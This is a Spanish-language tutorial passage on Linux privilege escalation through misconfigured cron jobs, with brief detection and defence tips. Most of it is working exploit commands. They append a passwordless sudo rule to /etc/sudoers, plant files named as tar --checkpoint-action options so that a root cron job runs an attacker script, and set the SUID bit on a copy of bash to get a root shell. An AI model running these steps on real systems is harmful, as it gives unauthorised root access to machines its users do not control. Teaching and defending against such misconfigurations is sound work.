En esta segunda parte exploramos tecnicas concretas de escalada de privilegios mediante Cron mal configurados: scripts editables por el usuario, wildcards peligrosas y la tecnica tar --checkpoint.

Scripts modificables por el usuario

Cuando un script ejecutado por root en Cron tiene permisos de escritura para nuestro usuario, podemos insertar codigo malicioso que se ejecutara con privilegios de root.

# Escenario: backup.sh se ejecuta como root cada 5 minutos
# y nuestro usuario puede escribir en el

# 1. Verificar permisos del script
ls -la /usr/local/bin/backup.sh
# -rwxrwxrwx 1 root root 120 ...  -> editable por todos!

# 2. Anadir comando malicioso
echo 'echo "usuario ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoers' >> /usr/local/bin/backup.sh

# 3. Esperar a que cron ejecute el script
# Ahora nuestro usuario tiene sudo sin password
Deteccion: Busca archivos en directorios cron con permisos debiles: find /etc/cron* -type f \( -perm -o+w -o -perm -g+w \) 2>/dev/null. Revisa tambien los scripts referenciados en los crontabs (cat /etc/crontab).

Wildcards peligrosas en scripts Cron

Cuando un script usa comodines (*) con comandos como tar, rm o chmod, podemos crear archivos con nombres que se interpreten como opciones del comando.

# Script vulnerable (backup.sh):
# tar czf /backup/backup.tar.gz /var/www/html/*

# 1. Crear un archivo cuyo nombre sea una opcion de tar
cd /var/www/html
touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=sh shell.sh"

# 2. Crear el script malicioso
echo '#!/bin/bash' > shell.sh
echo 'chmod +s /bin/bash' >> shell.sh

# 3. Cuando cron ejecute tar, encontrara los archivos
# y los interpretara como opciones, ejecutando shell.sh
# Resultado: /bin/bash tendra SUID activado

Ejemplo practico paso a paso

Veamos un escenario completo de explotacion de wildcards en Cron:

# En la maquina victima (como usuario normal)
# 1. Identificar tarea cron vulnerable
cat /etc/crontab
# */5 * * * * root tar czf /tmp/backup.tar.gz /home/user/*

# 2. Crear archivos con nombre de opciones
cd /home/user
echo '#!/bin/bash' > /tmp/exploit.sh
echo 'cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash' >> /tmp/exploit.sh
chmod +x /tmp/exploit.sh

touch -- "--checkpoint=1"
touch -- "--checkpoint-action=exec=bash /tmp/exploit.sh"

# 3. Esperar a que cron ejecute (maximo 5 minutos)
# 4. Ejecutar el bash con SUID
/tmp/rootbash -p
# whoami -> root
Defensa: Para prevenir ataques de wildcards, nunca uses comodines directamente en scripts Cron. Usa find ... -exec o separa los archivos con -- para indicar el fin de opciones: tar czf backup.tar.gz -- /var/www/html/*. Siempre verifica los permisos de los scripts en los directorios cron.
